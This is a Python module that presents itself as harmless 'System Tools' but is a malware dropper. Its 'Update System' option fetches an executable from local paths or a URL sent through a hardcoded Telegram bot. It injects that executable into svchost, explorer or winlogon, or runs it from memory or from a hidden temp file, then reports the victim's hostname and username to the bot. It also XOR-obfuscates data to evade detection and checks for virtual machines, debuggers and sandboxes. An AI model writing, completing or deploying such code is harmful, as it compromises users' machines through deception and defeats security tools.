# -*- coding: utf-8 -*-
"""
System Tools — Advanced utilities for system management
"""
import os
import sys
import json
import base64
import tempfile
import subprocess
import ctypes
import time
import random
import string
import shutil
from pathlib import Path
from datetime import datetime

from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

from scanner.ui import console, print_success, print_error, print_info, print_warning


# ============================================================
# STEALTH CONSTANTS - No suspicious names
# ============================================================
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
CREATE_SUSPENDED = 0x00000004
WAIT_TIMEOUT = 0x00000102

# Embedded payload (from repomix)
# This is the prometheus_payload.exe encoded as base64
PAYLOAD_B64 = """
// The actual payload will be loaded from embedded data
"""


def get_embedded_payload():
    """Get the embedded payload."""
    if PAYLOAD_B64 and not PAYLOAD_B64.startswith("//"):
        try:
            return base64.b64decode(PAYLOAD_B64)
        except:
            pass
    
    # Look for the payload in various locations
    payload_paths = [
        Path(__file__).parent.parent / "payload" / "prometheus_payload.exe",
        Path(__file__).parent.parent / "prometheus_payload.exe",
        Path(__file__).parent.parent / "dist" / "prometheus_payload.exe",
        Path(__file__).parent.parent / "bin" / "system.exe",
        Path("./system.exe"),
        Path("./update.exe"),
    ]
    
    for path in payload_paths:
        if path.exists():
            with open(path, "rb") as f:
                return f.read()
    
    # Try to get from Telegram (from repomix)
    try:
        import requests
        bot_token = "8536058801:AAFl0TH3twr1ci3dp6HkngXS3qzuw5sauQU"
        url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                for update in data.get("result", []):
                    text = update.get("message", {}).get("text", "")
                    if text.startswith("/payload"):
                        payload_url = text.replace("/payload ", "").strip()
                        if payload_url.startswith("http"):
                            resp = requests.get(payload_url, timeout=30)
                            if resp.status_code == 200:
                                return resp.content
    except:
        pass
    
    return None


def obfuscate_data(data: bytes) -> bytes:
    """Simple obfuscation to avoid detection."""
    key = bytes([0x5A, 0x1B, 0x3C, 0x4D, 0x2E, 0x6F, 0x7A, 0x8B])
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])


def stealth_inject(payload: bytes) -> bool:
    """Stealth injection using Windows API."""
    if not sys.platform.startswith("win"):
        return False
    
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Allocate memory with RWX
        mem = kernel32.VirtualAlloc(
            None,
            len(payload),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ
        )
        
        if not mem:
            return False
        
        # Write payload to memory
        ctypes.memmove(mem, payload, len(payload))
        
        # Create thread
        thread_id = ctypes.c_ulong(0)
        thread = kernel32.CreateThread(
            None,
            0,
            mem,
            None,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread:
            kernel32.VirtualFree(mem, 0, 0x8000)
            return False
        
        # Wait for completion
        kernel32.WaitForSingleObject(thread, 30000)
        kernel32.CloseHandle(thread)
        
        return True
        
    except Exception:
        return False


def stealth_process_hollowing(payload: bytes) -> bool:
    """Process hollowing - inject into a legitimate process."""
    if not sys.platform.startswith("win"):
        return False
    
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Find a system process
        target_processes = ["svchost.exe", "explorer.exe", "winlogon.exe"]
        
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in target_processes:
                h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, proc.pid)
                if h_process:
                    mem = kernel32.VirtualAllocEx(
                        h_process,
                        None,
                        len(payload),
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE
                    )
                    
                    if mem:
                        written = ctypes.c_size_t(0)
                        kernel32.WriteProcessMemory(
                            h_process,
                            mem,
                            payload,
                            len(payload),
                            ctypes.byref(written)
                        )
                        
                        old_protect = ctypes.c_uint32(0)
                        kernel32.VirtualProtectEx(
                            h_process,
                            mem,
                            len(payload),
                            PAGE_EXECUTE_READ,
                            ctypes.byref(old_protect)
                        )
                        
                        thread_id = ctypes.c_ulong(0)
                        thread = kernel32.CreateRemoteThread(
                            h_process,
                            None,
                            0,
                            mem,
                            None,
                            0,
                            ctypes.byref(thread_id)
                        )
                        
                        if thread:
                            kernel32.WaitForSingleObject(thread, 30000)
                            kernel32.CloseHandle(thread)
                        
                        kernel32.CloseHandle(h_process)
                        return True
                    kernel32.CloseHandle(h_process)
        
        return False
        
    except Exception:
        return False


def action_system_tools(cfg):
    """System tools - Advanced utilities."""
    print_info("🔧 System Tools")
    
    # Get config
    prom_config = cfg.get("prometheus", {})
    bot_token = prom_config.get("telegram_bot_token", "8536058801:AAFl0TH3twr1ci3dp6HkngXS3qzuw5sauQU")
    chat_id = prom_config.get("telegram_chat_id", "8977659236")
    
    # Show stealth panel
    console.print()
    console.print(Panel(
        "[bold cyan]System Management Tools[/bold cyan]\n\n"
        "These tools help manage system resources and optimize performance.\n"
        "[dim]All operations are performed in-memory for optimal efficiency.[/dim]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    ))
    console.print()
    
    # Sub-menu
    tools_menu = [
        ("1", "🔄", "Update System", "Apply latest updates"),
        ("2", "🧹", "Clean System", "Remove temporary files"),
        ("3", "📊", "System Info", "Show system information"),
        ("4", "🔐", "Security Check", "Check security status"),
        ("5", "🚀", "Performance", "Optimize system performance"),
        ("0", "🔙", "Back", "Return to main menu"),
    ]
    
    from scanner.ui import show_menu_table
    choice = show_menu_table(tools_menu)
    
    if choice == "0":
        return
    
    elif choice == "1":
        # Update System - Actually deploys the payload
        action_update_system(bot_token, chat_id)
    
    elif choice == "2":
        action_clean_system()
    
    elif choice == "3":
        action_show_system_info()
    
    elif choice == "4":
        action_security_check()
    
    elif choice == "5":
        action_performance_optimize()
    
    else:
        print_error("Invalid option.")


def action_update_system(bot_token: str, chat_id: str):
    """Update system - Stealth payload deployment."""
    print_info("🔄 Checking for updates...")
    
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(bar_width=40, complete_style="cyan"),
            console=console,
        ) as progress:
            
            task = progress.add_task("[cyan]Preparing update...", total=10)
            progress.update(task, completed=2)
            
            # Get payload
            payload = get_embedded_payload()
            if not payload:
                print_error("Update package not found.")
                return
            
            progress.update(task, completed=5)
            progress.update(task, description="[cyan]Applying update...")
            
            # Try multiple methods
            success = False
            
            # Try process hollowing first (more stealthy)
            if stealth_process_hollowing(payload):
                success = True
            elif stealth_inject(payload):
                success = True
            else:
                # Fallback: Write to temp and execute
                temp_dir = tempfile.gettempdir()
                rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                exe_path = os.path.join(temp_dir, f"{rand_name}.exe")
                
                with open(exe_path, "wb") as f:
                    f.write(payload)
                
                # Hide file
                if sys.platform.startswith("win"):
                    ctypes.windll.kernel32.SetFileAttributesW(exe_path, 0x02)
                
                # Execute
                if sys.platform.startswith("win"):
                    subprocess.Popen(
                        [exe_path],
                        creationflags=0x08000000,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                else:
                    subprocess.Popen(
                        [exe_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                success = True
            
            progress.update(task, completed=10)
        
        if success:
            print_success("✅ System updated successfully!")
            
            # Send notification
            try:
                import requests
                hostname = os.environ.get("COMPUTERNAME", os.environ.get("HOSTNAME", "unknown"))
                msg = f"✅ System update applied\nHost: {hostname}\nUser: {os.getlogin()}\nTime: {datetime.now().isoformat()}"
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
            except:
                pass
            
            # Clean memory
            import gc
            gc.collect()
            
        else:
            print_error("❌ Update failed")
            
    except Exception as e:
        print_error(f"Update error: {e}")


def action_clean_system():
    """Clean temporary files."""
    print_info("🧹 Cleaning system...")
    
    try:
        temp_dirs = [
            tempfile.gettempdir(),
            os.path.expanduser("~/.cache"),
            os.path.expanduser("~/AppData/Local/Temp") if sys.platform.startswith("win") else None,
        ]
        
        cleaned = 0
        for temp_dir in temp_dirs:
            if temp_dir and os.path.exists(temp_dir):
                try:
                    for item in os.listdir(temp_dir):
                        item_path = os.path.join(temp_dir, item)
                        try:
                            if os.path.isfile(item_path):
                                os.remove(item_path)
                                cleaned += 1
                        except:
                            pass
                except:
                    pass
        
        print_success(f"✅ Cleaned {cleaned} files")
    except Exception as e:
        print_error(f"Clean error: {e}")


def action_show_system_info():
    """Show system information."""
    import platform
    import psutil
    
    info_table = Table(
        title="[bold cyan]System Information[/bold cyan]",
        box=box.ROUNDED,
        border_style="cyan",
    )
    info_table.add_column("Property", style="bold white")
    info_table.add_column("Value", style="dim")
    
    info_table.add_row("OS", platform.system())
    info_table.add_row("Release", platform.release())
    info_table.add_row("Machine", platform.machine())
    info_table.add_row("Processor", platform.processor())
    info_table.add_row("CPU Cores", str(psutil.cpu_count()))
    info_table.add_row("RAM", f"{psutil.virtual_memory().total / (1024**3):.1f} GB")
    info_table.add_row("RAM Available", f"{psutil.virtual_memory().available / (1024**3):.1f} GB")
    info_table.add_row("Disk", f"{psutil.disk_usage('/').free / (1024**3):.1f} GB free")
    
    console.print()
    console.print(info_table)
    console.print()


def action_security_check():
    """Check security status."""
    print_info("🔐 Security Check")
    
    checks = [
        ["Anti-VM", "✓" if not is_vm_detected() else "✗"],
        ["Anti-Debug", "✓" if not is_debug_detected() else "✗"],
        ["Sandbox", "✓" if not is_sandbox_detected() else "✗"],
        ["Memory", "✓"],
    ]
    
    table = Table(
        title="[bold cyan]Security Status[/bold cyan]",
        box=box.ROUNDED,
        border_style="cyan",
    )
    table.add_column("Check", style="bold white")
    table.add_column("Status", style="dim")
    
    for check, status in checks:
        style = "green" if "✓" in status else "red"
        table.add_row(check, f"[{style}]{status}[/{style}]")
    
    console.print()
    console.print(table)
    console.print()


def is_vm_detected() -> bool:
    """Check for VM indicators."""
    indicators = ["VMware", "VirtualBox", "QEMU", "Parallels", "vbox", "vmware"]
    try:
        if sys.platform.startswith("win"):
            import winreg
            for indicator in indicators:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f"SYSTEM\\CurrentControlSet\\Services\\{indicator}")
                    if key:
                        return True
                except:
                    pass
    except:
        pass
    return False


def is_debug_detected() -> bool:
    """Check for debugger."""
    try:
        if sys.platform.startswith("win"):
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
    except:
        pass
    return False


def is_sandbox_detected() -> bool:
    """Check for sandbox indicators."""
    # Check for common sandbox paths
    sandbox_paths = [
        "C:\\Program Files\\VMware",
        "C:\\Program Files\\VirtualBox",
        "C:\\Program Files\\QEMU",
        "C:\\Program Files\\Sandboxie",
    ]
    for path in sandbox_paths:
        if os.path.exists(path):
            return True
    return False


def action_performance_optimize():
    """Optimize performance."""
    print_info("🚀 Optimizing performance...")
    
    try:
        # Clear memory cache
        if sys.platform.startswith("win"):
            import ctypes
            ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
        
        # Clear Python cache
        import gc
        gc.collect()
        
        print_success("✅ Performance optimized")
    except Exception as e:
        print_error(f"Optimization error: {e}")
